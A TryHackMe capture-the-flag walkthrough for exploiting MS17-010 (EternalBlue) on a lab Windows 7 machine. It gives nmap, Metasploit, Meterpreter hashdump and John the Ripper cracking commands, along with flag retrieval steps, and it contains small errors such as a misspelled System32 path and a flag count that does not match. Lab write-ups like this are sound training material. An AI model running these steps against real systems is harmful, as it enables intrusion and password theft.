# üîì EternalBlue - TryHackMe Walkthrough

Welcome to the complete walkthrough of the [EternalBlue](https://tryhackme.com/room/eternalblue) room on TryHackMe.  
This room demonstrates how to exploit **MS17-010 (EternalBlue)** on a vulnerable Windows machine.

---

## üß† Room Overview

> EternalBlue is a critical SMBv1 vulnerability used in real-world ransomware attacks such as WannaCry.  
> This walkthrough guides you through enumeration, exploitation, and post-exploitation steps.

## üì° Step 1: Enumeration

### üîç Nmap Full Scan

```bash
nmap -p- -sV -T4 -A <target-ip>
```
![nmap_scan](images/nmap.png)

The Nmap scan shows that port 445 is open, indicating SMB service ‚Äî a potential target for the **MS17-010 (EternalBlue)** exploit.

## ‚öîÔ∏è Step 2: Exploitation with Metasploit

We will now exploit the target using the **MS17-010 (EternalBlue)** vulnerability via Metasploit.

### üß© Launch Metasploit
Start Metasploit Framework:

```bash
msfconsole
```
![msfconsole](images/msfconsole.png)

Once inside Metasploit, search for the exploit module:

```bash
search eternalblue
```
![search](images/Search.png)

select the first one using
```bash
use 0
options
```
![options](images/options.png)

Here Rhost is blank so we can give rhosts by
```bash
set RHOSTS <target ip>
```
Lhost is our system ip, so we have to change it to our vpn ip

For VPN ip, take a new terminal and type
```bash
ipconfig
```
take the ip in tun0 and set it to lhost
```bash
set LHOST <vpn ip>
```
![rhosts](images/rhosts.png)

Now the ip is Assigned and Ready for Exploit
```bash
exploit
```
![exploit](images/exploit.png)

## üß™ Step 3: Post-Exploitation

Once the **EternalBlue (MS17-010)** exploit succeeds, we get a **Meterpreter session** ‚Äî a powerful post-exploitation shell provided by Metasploit.

---

### üñ•Ô∏è Verify Access and System Info

Check system information of the victim machine:

```bash
meterpreter > pwd
```
### üîê Dumping and Cracking Password Hashes

With a Meterpreter session active, we can attempt to dump the user password hashes.

First, try using the built-in hash dumping command:

```bash
meterpreter > hashdump
```

This may return something like:

![hashes](images/Hashes.png)

üìù Save Hashes to a File
Copy and paste the output into a text file on your local machine, e.g., ```pass.txt.```

![pass](images/pass.png)

üîì Crack Hashes with John the Ripper
Use the ```rockyou.txt``` wordlist to crack NTLM hashes:
```bash
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```
![john](images/john.png)

## üè≥Ô∏è Flags

During post-exploitation, we discovered two flags in the victim's system that confirm successful access and lateral movement.

---

### üèÅ Flag 1: Local Access Confirmation

We need to navigate to the root `C:\` directory and locate the `flag1.txt` file.

```bash
meterpreter > cd ../../
```
List files:

```bash
meterpreter > ls
```

![back to c](images/back_to_C.png)

Read the contents of the flag:
```bash
meterpreter > cat flag1.txt
```
![flag1](images/flag1.png)

### üèÅ Flag 2: Deeper System Access

Flag 2 is usually found under system32 directory, such as: `C:\Windows\System32\config\flag2.txt`.

Command:
```bash
meterpreter > cd C:\\Windows\\Sysyem32\\config
meterpreter > cat flag2.txt
```
![flag2](images/flag2.png)

### üèÅ Flag 3: User-Level Document Discovery

Flag 3 is usually found under a user directory, such as: `C:\Users\jon\Documents\flag3.txt`

Command:
```bash
meterpreter > cd C:\\Users\\jon\\Documents
meterpreter > ls
meterpreter > cat flag3.txt
```
![flag3](images/flag3.png)

## üß† Final Thoughts

This TryHackMe room demonstrated how a critical vulnerability like **MS17-010 (EternalBlue)** can be used to gain full control over a Windows 7 system.

We went through:

- Scanning the machine using `nmap`  
- Using **Metasploit** to exploit the EternalBlue vulnerability  
- Gaining a **Meterpreter shell** and escalating privileges  
- Navigating the system and retrieving **three flags**  
- Dumping and cracking **password hashes**  
- Exploring both **system-level and user-level data**

This walkthrough reinforces the importance of:

- Keeping systems patched (MS17-010 is from 2017!)  
- Disabling deprecated services like SMBv1  
- Monitoring privilege escalation paths in Windows environments
